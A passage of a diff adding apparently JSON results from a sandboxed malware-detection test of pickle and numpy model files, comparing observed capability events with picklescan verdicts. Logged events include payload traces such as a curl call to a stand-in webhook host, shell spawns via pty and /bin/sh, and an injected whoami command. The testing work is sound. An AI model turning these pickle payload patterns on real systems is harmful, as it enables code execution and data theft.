+        "subprocess.Popen: /bin/sh"
+      ],
+      "events_total": 8,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-q77w-mwjj-7mqx.pkl: AttributeError: 'dict' object has no attribute '_proc'"
+      ]
+    },
+    {
+      "sample": "GHSA-r8g5-cgf2-4m4m.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-r8g5-cgf2-4m4m.pkl: ModuleNotFoundError: No module named 'numpy' (unresolved global: numpy.f2py.crackfortran.getlincoef)"
+      ]
+    },
+    {
+      "sample": "GHSA-vqmv-47xg-9wpr.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: pty.spawn",
+        "os.forkpty: "
+      ],
+      "events_total": 3,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "GHSA-vr7h-p6mm-wpmh.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-vr7h-p6mm-wpmh.pkl: ModuleNotFoundError: No module named 'torch' (unresolved global: torch.jit.unsupported_tensor_ops.execWrapper)"
+      ]
+    },
+    {
+      "sample": "GHSA-vv6j-3g6g-2pvj.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-vv6j-3g6g-2pvj.pkl: ModuleNotFoundError: No module named 'torch' (unresolved global: torch.utils._config_module.ConfigModule.load_config)"
+      ]
+    },
+    {
+      "sample": "GHSA-vvpj-8cmc-gx39.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 1,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "GHSA-x696-vm39-cp64.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: profile.Profile.run"
+      ],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-x696-vm39-cp64.pkl: AttributeError: 'dict' object has no attribute 'runctx'"
+      ]
+    },
+    {
+      "sample": "GHSA-xp4f-hrf8-rxw7.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "subprocess.Popen: /usr/local/bin/python"
+      ],
+      "events_total": 4,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "GHSA-xp4f-hrf8-rxw7.pkl: CalledProcessError: Command '['/usr/local/bin/python', '-W', 'ignore::DeprecationWarning', '-c', '\\nimport runpy\\nimport sys\\nsys.path = [] + sys.path\\nsys.argv[1:] = __import__(\\'os\\').system(\\'whoami\\')\\nrunpy.run_module(\"pip\", run_name=\"__main__\", alter_sys=True)\\n']' returned non-zero exit status 1."
+      ]
+    },
+    {
+      "sample": "cloudpickle_codeinjection.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "cloudpickle_codeinjection.pkl: ModuleNotFoundError: No module named 'cloudpickle' (unresolved global: cloudpickle.cloudpickle._make_function)"
+      ]
+    },
+    {
+      "sample": "dns_exfiltration.npy",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 0,
+      "picklescan_infected": false,
+      "picklescan_clean": true,
+      "errors": [
+        "no custom code and no weight files found"
+      ]
+    },
+    {
+      "sample": "int_array.npy",
+      "truth": "unlabelled",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 0,
+      "picklescan_infected": false,
+      "picklescan_clean": true,
+      "errors": [
+        "no custom code and no weight files found"
+      ]
+    },
+    {
+      "sample": "int_arrays.npz",
+      "truth": "unlabelled",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 0,
+      "picklescan_infected": false,
+      "picklescan_clean": null,
+      "errors": [
+        "no custom code and no weight files found"
+      ]
+    },
+    {
+      "sample": "int_arrays_compressed.npz",
+      "truth": "unlabelled",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 0,
+      "picklescan_infected": false,
+      "picklescan_clean": null,
+      "errors": [
+        "no custom code and no weight files found"
+      ]
+    },
+    {
+      "sample": "io_FileIO.pkl",
+      "truth": "unlabelled",
+      "quarantine_observed": true,
+      "capability_events": [
+        "file.read: /etc/hosts"
+      ],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "keyerror-exploit.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: os.system",
+        "os.system: b'echo \"pwned by memo keyerror\"'"
+      ],
+      "events_total": 3,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "keyerror-exploit.pkl: UnpicklingError: Memo value not found at index 3"
+      ]
+    },
+    {
+      "sample": "logging_FileHandler.pkl",
+      "truth": "unlabelled",
+      "quarantine_observed": true,
+      "capability_events": [
+        "file.read: /work/evil.log"
+      ],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "malicious1_crc.zip",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 0,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "no custom code and no weight files found"
+      ]
+    },
+    {
+      "sample": "malicious21.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "os.system: b'curl https://webhook.invalid/1234'"
+      ],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "malicious22.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "malicious22.pkl: ModuleNotFoundError: No module named 'numpy' (unresolved global: numpy.testing._private.utils.runstring)"
+      ]
+    },
+    {
+      "sample": "malicious23.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: os.system",
+        "os.system: b'ls'"
+      ],
+      "events_total": 2,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "object_array.npy",
+      "truth": "unlabelled",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 0,
+      "picklescan_infected": false,
+      "picklescan_clean": true,
+      "errors": [
+        "no custom code and no weight files found"
+      ]
+    },
+    {
+      "sample": "object_arrays.npz",
+      "truth": "unlabelled",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 0,
+      "picklescan_infected": false,
+      "picklescan_clean": null,
+      "errors": [
+        "no custom code and no weight files found"
+      ]
+    },
+    {
+      "sample": "object_arrays_compressed.npz",
+      "truth": "unlabelled",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 0,
+      "picklescan_infected": false,
+      "picklescan_clean": null,
+      "errors": [
+        "no custom code and no weight files found"
+      ]
+    },
+    {
+      "sample": "type-confusion-exploit.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: os.system",
+        "os.system: b'echo \"type-confusion-exploit\"'"
+      ],
+      "events_total": 3,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "type-confusion-exploit.pkl: UnpicklingError: STACK_GLOBAL requires str"
+      ]
+    },
+    {
+      "sample": "types_CodeType.pkl",
+      "truth": "malicious",
+      "quarantine_observed": false,
+      "capability_events": [],
+      "events_total": 1,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": []
+    },
+    {
+      "sample": "urllib_request_urlopen.pkl",
+      "truth": "malicious",
+      "quarantine_observed": true,
+      "capability_events": [
+        "pickle.find_class: urllib.request.urlopen",
+        "socket.getaddrinfo: example.invalid"
+      ],
+      "events_total": 8,
+      "picklescan_infected": true,
+      "picklescan_clean": false,
+      "errors": [
+        "urllib_request_urlopen.pkl: URLError: <urlopen error [Errno -3] Temporary failure in name resolution>"
+      ]
+    }
+  ],
+  "note": "This is the observation step only: does the contained run see capability? It needs no model, and a sample we do not observe is one we could not judge from behaviour - which is exactly what the escalation path is for."
+}
